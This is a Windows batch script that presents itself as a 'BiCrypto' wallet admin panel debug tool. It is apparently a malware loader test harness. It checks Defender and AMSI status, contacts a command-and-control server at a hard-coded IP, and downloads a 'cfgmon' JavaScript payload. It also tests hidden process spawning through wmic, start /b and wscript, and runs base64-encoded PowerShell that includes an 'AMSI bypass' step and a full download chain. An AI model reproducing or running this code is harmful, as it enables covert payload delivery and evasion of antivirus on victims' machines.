@echo off
setlocal enabledelayedexpansion
:: ============================================================
::  BiCrypto Debug v2 — writes results to Desktop\bc_debug.txt
:: ============================================================
set LOG=%USERPROFILE%\Desktop\bc_debug.txt
echo BiCrypto Debug Log > "%LOG%"
echo Date: %DATE% %TIME% >> "%LOG%"
echo User: %USERNAME% >> "%LOG%"
echo AppData: %APPDATA% >> "%LOG%"
echo Temp: %TEMP% >> "%LOG%"
echo. >> "%LOG%"

:: ── STEP 1: wmic available? ──────────────────────────────────
echo [STEP 1] Checking wmic... >> "%LOG%"
wmic os get Caption /value >nul 2>&1
if %errorlevel%==0 (
    echo     wmic: OK >> "%LOG%"
) else (
    echo     wmic: NOT AVAILABLE errorlevel=%errorlevel% >> "%LOG%"
)

:: ── STEP 2: PowerShell available? ────────────────────────────
echo [STEP 2] Checking PowerShell... >> "%LOG%"
powershell -NoP -NonI -Command "Write-Output ('PS version: ' + $PSVersionTable.PSVersion.ToString())" >> "%LOG%" 2>&1
if %errorlevel%==0 (
    echo     PowerShell: OK >> "%LOG%"
) else (
    echo     PowerShell: FAILED errorlevel=%errorlevel% >> "%LOG%"
)

:: ── STEP 3: ExecutionPolicy ──────────────────────────────────
echo [STEP 3] Execution policy... >> "%LOG%"
powershell -NoP -NonI -Command "Write-Output ('Policy: ' + (Get-ExecutionPolicy))" >> "%LOG%" 2>&1

:: ── STEP 4: Defender status ──────────────────────────────────
echo [STEP 4] Defender status... >> "%LOG%"
powershell -NoP -NonI -Command "try { $s=Get-MpComputerStatus -EA Stop; Write-Output ('Defender RealTime: ' + $s.RealTimeProtectionEnabled + ' | AMSI: ' + $s.AmsiFallbackDetection + ' | BehaviorMon: ' + $s.BehaviorMonitorEnabled) } catch { Write-Output 'Defender: not running or error' }" >> "%LOG%" 2>&1

:: ── STEP 5: Network to C2 ────────────────────────────────────
echo [STEP 5] Network to C2 (207.180.245.175:8080)... >> "%LOG%"
powershell -NoP -NonI -Command "try { $r=(New-Object Net.WebClient).DownloadString('http://207.180.245.175:8080/ping'); Write-Output ('C2 /ping: ' + $r) } catch { Write-Output ('C2 /ping FAILED: ' + $_.Exception.Message) }" >> "%LOG%" 2>&1

:: ── STEP 6: Download cfgmon ──────────────────────────────────
echo [STEP 6] Download cfgmon from C2... >> "%LOG%"
powershell -NoP -NonI -Command "try { $f=[IO.Path]::GetTempFileName()+'.js'; (New-Object Net.WebClient).DownloadFile('http://207.180.245.175:8080/cfgmon',$f); $sz=(Get-Item $f).length; Write-Output ('cfgmon download: OK - ' + $sz + ' bytes at ' + $f); Remove-Item $f -Force } catch { Write-Output ('cfgmon download FAILED: ' + $_.Exception.Message) }" >> "%LOG%" 2>&1

:: ── STEP 7: wmic process spawn test ─────────────────────────
echo [STEP 7] wmic spawn test... >> "%LOG%"
if exist "%TEMP%\bc_wmic.txt" del "%TEMP%\bc_wmic.txt" >nul 2>&1
wmic process call create "powershell -NoP -NonI -w h -Command \"[IO.File]::WriteAllText('%TEMP%\bc_wmic.txt','wmic_spawn_ok')\"" >nul 2>&1
timeout /t 4 /nobreak >nul
if exist "%TEMP%\bc_wmic.txt" (
    echo     wmic spawn: OK - process ran >> "%LOG%"
    del "%TEMP%\bc_wmic.txt" >nul 2>&1
) else (
    echo     wmic spawn: FAILED - file not created >> "%LOG%"
)

:: ── STEP 8: start /b spawn test ──────────────────────────────
echo [STEP 8] start /b spawn test... >> "%LOG%"
if exist "%TEMP%\bc_start.txt" del "%TEMP%\bc_start.txt" >nul 2>&1
start "" /b powershell -NoP -NonI -w h -Command "[IO.File]::WriteAllText('%TEMP%\bc_start.txt','start_spawn_ok')"
timeout /t 4 /nobreak >nul
if exist "%TEMP%\bc_start.txt" (
    echo     start /b spawn: OK - process ran >> "%LOG%"
    del "%TEMP%\bc_start.txt" >nul 2>&1
) else (
    echo     start /b spawn: FAILED - file not created >> "%LOG%"
)

:: ── STEP 9: EncodedCommand test ──────────────────────────────
echo [STEP 9] EncodedCommand test... >> "%LOG%"
:: "Write-Output 'enc_ok'" in base64 UTF-16LE
if exist "%TEMP%\bc_enc.txt" del "%TEMP%\bc_enc.txt" >nul 2>&1
powershell -NoP -NonI -w h -EnC VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGUAbgBjAF8AbwBrACcA >nul 2>&1
echo     EncodedCommand exit: %errorlevel% >> "%LOG%"

:: ── STEP 10: AMSI bypass test (write file) ───────────────────
echo [STEP 10] Encoded + write file test (Defender check)... >> "%LOG%"
if exist "%TEMP%\bc_amsi.txt" del "%TEMP%\bc_amsi.txt" >nul 2>&1
:: Encoded: [IO.File]::WriteAllText($env:TEMP+'\bc_amsi.txt','amsi_ok')
powershell -NoP -NonI -w h -EnC WwBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABUAGUAeAB0ACgAJABlAG4AdgA6AFQARQBNAFAAJQB0ACcAXABiAGMAXwBhAG0AcwBpAC4AdAB4AHQAJwAsACcAYQBtAHMAaQBfAG8AawAnACkA >nul 2>&1
timeout /t 3 /nobreak >nul
if exist "%TEMP%\bc_amsi.txt" (
    echo     Encoded write test: OK - Defender not blocking basic PS >> "%LOG%"
    del "%TEMP%\bc_amsi.txt" >nul 2>&1
) else (
    echo     Encoded write test: FAILED - Defender likely blocking EncodedCommand >> "%LOG%"
)

:: ── STEP 11: WebClient + write (full chain minus cscript) ────
echo [STEP 11] Full chain test (download + write file)... >> "%LOG%"
if exist "%TEMP%\bc_chain.txt" del "%TEMP%\bc_chain.txt" >nul 2>&1
:: Encoded PS: $f=[IO.Path]::GetTempFileName()+'.js';(New-Object Net.WebClient).DownloadFile('http://207.180.245.175:8080/cfgmon',$f);[IO.File]::WriteAllText($env:TEMP+'\bc_chain.txt',(Get-Item $f).Length.ToString());Remove-Item $f -Force
powershell -NoP -NonI -w h -EnC JABmAD0AWwBJAE8ALgBQAGEAdABoAF0AOgA6AEcAZQB0AFQAZQBtAHAARgBpAGwAZQBOAGEAbQBlACgAKQArACcALgBqAHMAJwA7ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvADIAMAA3AC4AMQA4ADAALgAyADQANQAuADEANwA1ADoAOAAwADgAMAAvAGMAZgBnAG0AbwBuACcALAAkAGYAKQA7AFsASQBPAC4ARgBpAGwAZQBdADoAOgBXAHIAaQB0AGUAQQBsAGwAVABlAHgAdAAoACQAZQBuAHYAOgBUAEUATQBQACsAJwBcAGIAYwBfAGMAaABhAGkAbgAuAHQAeAB0ACcALAAoAEcAZQB0AC0ASQB0AGUAbQAgACQAZgApAC4ATABlAG4AZwB0AGgALgBUAG8AUwB0AHIAaQBuAGcAKAApACkAOwBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAkAGYAIAAtAEYAbwByAGMAZQA= >nul 2>&1
timeout /t 6 /nobreak >nul
if exist "%TEMP%\bc_chain.txt" (
    set /p SZ=<"%TEMP%\bc_chain.txt"
    echo     Full chain: OK - cfgmon size=!SZ! bytes >> "%LOG%"
    del "%TEMP%\bc_chain.txt" >nul 2>&1
) else (
    echo     Full chain: FAILED - either download or write blocked >> "%LOG%"
)

:: ── STEP 12: VBScript launch test (no PS) ────────────────────
echo [STEP 12] VBScript direct launch test (no PowerShell)... >> "%LOG%"
if exist "%TEMP%\bc_vbs.txt" del "%TEMP%\bc_vbs.txt" >nul 2>&1
echo Set fso=CreateObject("Scripting.FileSystemObject") > "%TEMP%\bc_t.vbs"
echo Set f=fso.CreateTextFile("%TEMP%\bc_vbs.txt",True) >> "%TEMP%\bc_t.vbs"
echo f.Write "vbs_ok" >> "%TEMP%\bc_t.vbs"
echo f.Close >> "%TEMP%\bc_t.vbs"
wscript //B //NoLogo "%TEMP%\bc_t.vbs"
timeout /t 2 /nobreak >nul
if exist "%TEMP%\bc_vbs.txt" (
    echo     VBScript spawn: OK >> "%LOG%"
    del "%TEMP%\bc_vbs.txt" >nul 2>&1
) else (
    echo     VBScript spawn: FAILED >> "%LOG%"
)
if exist "%TEMP%\bc_t.vbs" del "%TEMP%\bc_t.vbs" >nul 2>&1

:: ── STEP 13: VBScript + WinHttp download test ────────────────
echo [STEP 13] VBScript WinHttp download test... >> "%LOG%"
if exist "%TEMP%\bc_vhttp.txt" del "%TEMP%\bc_vhttp.txt" >nul 2>&1
echo Set h=CreateObject("WinHttp.WinHttpRequest.5.1") > "%TEMP%\bc_h.vbs"
echo h.Open "GET","http://207.180.245.175:8080/ping",False >> "%TEMP%\bc_h.vbs"
echo h.Send >> "%TEMP%\bc_h.vbs"
echo Set fso=CreateObject("Scripting.FileSystemObject") >> "%TEMP%\bc_h.vbs"
echo Set f=fso.CreateTextFile("%TEMP%\bc_vhttp.txt",True) >> "%TEMP%\bc_h.vbs"
echo f.Write "http_ok:" ^& h.ResponseText >> "%TEMP%\bc_h.vbs"
echo f.Close >> "%TEMP%\bc_h.vbs"
wscript //B //NoLogo "%TEMP%\bc_h.vbs"
timeout /t 5 /nobreak >nul
if exist "%TEMP%\bc_vhttp.txt" (
    set /p HRESP=<"%TEMP%\bc_vhttp.txt"
    echo     VBScript WinHttp: OK response=!HRESP! >> "%LOG%"
    del "%TEMP%\bc_vhttp.txt" >nul 2>&1
) else (
    echo     VBScript WinHttp: FAILED >> "%LOG%"
)
if exist "%TEMP%\bc_h.vbs" del "%TEMP%\bc_h.vbs" >nul 2>&1

:: ── DONE ─────────────────────────────────────────────────────
echo. >> "%LOG%"
echo ============================================ >> "%LOG%"
echo DEBUG COMPLETE >> "%LOG%"
echo ============================================ >> "%LOG%"

cls
echo.
echo   ██████╗ ██╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗
echo   ██╔══██╗██║██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗
echo   ██████╔╝██║██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║
echo   ██╔══██╗██║██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║
echo   ██████╔╝██║╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝
echo   ╚═════╝ ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝
echo.
echo   Wallet Admin Panel v5.2.0
echo.
echo   [*] Debug log written to: %USERPROFILE%\Desktop\bc_debug.txt
echo.
echo   Open bc_debug.txt on your Desktop to see results.
echo.
pause
